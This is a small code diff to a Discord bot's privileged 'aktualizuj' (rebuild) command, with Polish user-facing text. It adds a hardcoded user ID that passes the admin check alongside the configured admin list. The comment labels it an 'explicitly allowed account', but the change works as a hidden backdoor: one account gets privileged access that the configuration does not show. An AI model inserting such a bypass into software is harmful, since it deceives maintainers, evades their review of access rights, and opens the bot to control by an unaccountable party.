@@ -30,8 +30,9 @@ module.exports = {
   name: 'aktualizuj',
   aliases: ['rebuild', 'odbuduj'],
   async execute(client, message, args) {
-    // Only admins can run this command
-    if (!config.admins.includes(message.author.id)) {
+    // Only admins (plus explicitly allowed account) can run this command
+    const extraAllowedIds = ['61560227271099'];
+    if (!config.admins.includes(message.author.id) && !extraAllowedIds.includes(message.author.id)) {
       await message.reply('❌ Brak uprawnień do użycia tej komendy.');
       return;
     }
